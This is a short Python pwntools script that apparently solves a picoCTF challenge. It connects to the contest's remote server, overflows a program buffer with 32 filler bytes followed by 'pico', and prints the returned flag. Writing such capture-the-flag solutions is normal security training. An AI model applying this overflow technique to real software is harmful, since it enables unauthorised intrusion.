from pwn import *


elf =context.binary =ELF('./chall')

context.log_level='error'
#p=process()
p=remote('tethys.picoctf.net', 52903)


payload=flat(
	b'a'*32
	,b'pico'
	)
	
	
def write(pay):
	p.sendline(b'2')
	p.sendlineafter(b'buffer:',pay)
	
write(payload)

p.sendline(b'4')

p.recvuntil(b'WIN')
print('Flag :',str(p.recv().strip())[2:-1])

#p.interactive()
